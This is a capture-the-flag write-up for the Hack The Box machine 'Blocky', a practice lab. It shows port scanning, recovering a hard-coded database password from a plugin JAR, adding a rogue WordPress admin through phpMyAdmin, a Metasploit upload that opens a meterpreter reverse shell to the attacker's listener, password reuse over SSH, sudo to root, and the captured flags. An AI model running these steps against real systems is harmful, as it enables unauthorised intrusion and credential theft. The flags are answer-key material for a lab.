# Blocky

URL: https://app.hackthebox.com/machines/Blocky

Level: Easy

Date 10 Jul 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sat Jul 10 11:04:01 2021 as: nmap -T4 -p- -oN 01_nmap.txt 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.046s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft

# Nmap done at Sat Jul 10 11:05:58 2021 -- 1 IP address (1 host up) scanned in 117.98 seconds
```

```
# Nmap 7.91 scan initiated Sat Jul 10 11:06:42 2021 as: nmap -T4 -A -p21,22,80,25565 -oN 02_nmap_withA.txt 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.047s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   48.98 ms 10.10.14.1
2   49.10 ms 10.10.10.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 10 11:06:59 2021 -- 1 IP address (1 host up) scanned in 18.78 seconds
```

We run `gobuster`:

```
gobuster dir -u http://10.10.10.37:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o 04_gobuster.txt
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/]
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.10.37/javascript/]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.37/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.10.37/phpmyadmin/]
/server-status        (Status: 403) [Size: 299]
```

Then we explore some findings.

/phpmyadmin shows a phpMyAdmin login page.

/wp-inclues allows indexing.

/plugins shows a couple of files:

`BlockyCore.jar`

`griefprevention-1.11.2-3.1.1.298.jar`

We extract the first one:

```
jar xf BlockyCore.jar
```

and we run `strings` on `BlockyCore.class`:

```
root@kali:/opt/htb/Blocky/blockycore/com/myfirstplugin# strings BlockyCore.class
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
        localhost
root
8YsqfCTnvxAUeduzjNSXe22
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java
```

So far, we got some credentials:

```
root
8YsqfCTnvxAUeduzjNSXe22
```

We try on /phpmyadmin and we get success.

We dump `wp_users` table and we try to get access as "Notch" user:

```
INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES
(1, 'Notch', '$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/', 'notch', 'notch@blockcraftfake.com', '', '2017-07-02 23:49:07', '', 0, 'Notch');
```

It seems that Notch password is `bb6170699e869d2daba5131a51681aef` (Google search), by the way we add our user:

https://wpengine.com/support/add-admin-user-phpmyadmin/

```
user: oblivion
pass: asdasdlol
```

Since we have valid credentials, we try with `msfconsole`:

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME oblivion
USERNAME => oblivion
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD asdasdlol
PASSWORD => asdasdlol
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.37
RHOSTS => 10.10.10.37
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   asdasdlol        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.37      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   oblivion         yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.88.10    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST tun0
LHOST => tun0
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Authenticating with WordPress using oblivion:asdasdlol...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/vuJOXoEGoO/ALFTyZjtAc.php...
[*] Sending stage (39282 bytes) to 10.10.10.37
[+] Deleted ALFTyZjtAc.php
[+] Deleted vuJOXoEGoO.php
[+] Deleted ../vuJOXoEGoO
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.37:46268) at 2021-07-10 12:04:31 +0200

meterpreter > id
[-] Unknown command: id
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > shell
Process 1757 created.
Channel 0 created.
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# User-flag

From here we can upgrade our shell, by the way is seems that there is another path.

We try SSH access as Notch with same mysql root password, and we are in!

```
root@kali:/opt/htb/Blocky# ssh notch@10.10.10.37
notch@10.10.10.37's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$
```

Now we can grab user flag.

# Privesc

Very easy:

```
notch@Blocky:~$ sudo -l
[sudo] password for notch:
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL


notch@Blocky:~$ sudo bash
root@Blocky:~# cd
root@Blocky:~#
root@Blocky:~#
root@Blocky:~#
root@Blocky:~# cd /home/notch/
root@Blocky:~# ls
minecraft  user.txt
root@Blocky:~# cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5root@Blocky:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Blocky:~# ls
minecraft  user.txt
root@Blocky:~# cd /root/
root@Blocky:/root# ls
root.txt
root@Blocky:/root# cat root.txt
0a9694a5b4d272c694679f7860f1cd5f
```


